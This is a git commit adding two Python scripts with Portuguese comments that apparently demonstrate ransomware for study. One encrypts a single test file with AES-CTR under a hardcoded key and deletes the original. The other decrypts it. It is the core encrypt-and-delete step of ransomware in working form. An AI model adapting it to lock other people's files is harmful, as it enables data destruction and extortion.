6a08b9b7560f9e5bd0115cd251748259aae1495d
Isabela Lamb <36643350+isabelalamb@users.noreply.github.com>
2023-12-14 13:18:03 -0300

    Add files via upload

---
+++ decrypter.py
@@ -0,0 +1,22 @@
+import os
+import pyaes
+
+## abre o arquivo criptografado
+file_name = "teste.txt.criptografado"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+## chave para descriptografia
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+decrypt_data = aes.decrypt(file_data)
+
+## remove o arquivo criptografado
+os.remove(file_name)
+
+## cria o arquivo descriptografado
+new_file = "teste.txt"
+new_file = open(f'{new_file}', "wb")
+new_file.write(decrypt_data)
+new_file.close()
---
+++ encrypter.py
@@ -0,0 +1,24 @@
+import os
+import pyaes
+
+## abre o arquivo a ser criptografado
+file_name = "teste.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+## remove o arquivo
+os.remove(file_name)
+
+## chave de criptografia
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+## criptografa o arquivo
+crypto_data = aes.encrypt(file_data)
+
+## salva o arquivo criptografado
+new_file = file_name + ".criptografado"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
